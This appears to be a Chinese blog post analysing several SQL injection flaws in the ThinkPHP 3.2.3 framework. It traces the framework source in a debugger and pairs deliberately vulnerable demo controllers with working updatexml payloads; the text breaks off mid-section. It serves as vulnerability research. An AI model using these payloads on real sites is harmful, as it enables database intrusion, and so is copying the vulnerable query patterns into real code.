    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T05:17:44.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>            <span class="token punctuation">}</span>            <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$options</span>     <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'_string'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 字符串模式查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_complex'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 复合查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><pre><code>1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><pre><code>id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uname</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string">'UPDATE '</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSet</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 多表更新支持JOIN操作</span>            <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//  单表更新支持order和lmit</span>            <span class="token variable">$sql</span>   <span class="token punctuation">.</span><span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bind</span><span class="token punctuation">[</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><pre><code>id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">''</span><span class="token punctuation">:</span><span class="token string">' WHERE '</span><span class="token punctuation">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span></code></pre><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果条件为空 不进行删除操作 除非设置 1=1</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$pkValue</span>            <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   </code></pre><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eq'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">order</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'order'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><pre><code>order=id 